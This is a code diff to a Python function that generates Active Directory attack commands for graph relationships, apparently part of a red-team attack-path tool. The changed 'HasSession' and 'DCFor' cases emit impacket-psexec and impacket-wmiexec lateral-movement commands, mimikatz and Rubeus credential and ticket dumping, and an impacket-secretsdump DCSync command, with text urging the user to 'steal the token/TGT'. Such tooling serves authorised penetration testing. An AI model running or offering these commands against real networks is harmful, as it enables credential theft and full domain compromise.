@@ -113,10 +113,12 @@ def get_commands(
            Defaults to src_name if empty.
     """
     act = _parse(actor or src_name, src_kind)
+    src = _parse(src_name or src_id, src_kind)
     dst = _parse(dst_name or dst_id, dst_kind)
 
     A  = act["short"]   # attacker short name
     D  = act["domain"]  # attacker domain
+    SF = src["fqdn"]    # source FQDN / display name
     T  = dst["short"]   # target short name
     TF = dst["fqdn"]    # target FQDN
 
@@ -181,10 +183,11 @@ def get_commands(
 
         case "HasSession":
             return CommandSet(
-                f"{TF} has an active session from a privileged user. Connect and steal the token.",
+                f"{SF} has an active session for {TF}. Connect to {SF} and steal the token/TGT.",
                 [
-                    f"impacket-psexec '{D}/{A}:{PASS}@{TF}'",
-                    "# Once on host — dump sessions:",
+                    f"impacket-psexec '{D}/{A}:{PASS}@{SF}'",
+                    f"impacket-wmiexec '{D}/{A}:{PASS}@{SF}'",
+                    "# Once on the host — dump sessions:",
                     "# mimikatz: sekurlsa::logonpasswords",
                     "# Rubeus:   Rubeus.exe dump /nowrap",
                 ],
@@ -454,9 +457,9 @@ def get_commands(
 
         case "DCFor":
             return CommandSet(
-                f"{TF} is a DC for this domain — credentials let you DCSync.",
+                f"{SF} is a DC for {TF} — use it as the DC endpoint for DCSync.",
                 [
-                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{TF}'",
+                    f"impacket-secretsdump -just-dc '{D}/{A}:{PASS}@{SF}'",
                 ],
             ), na
 
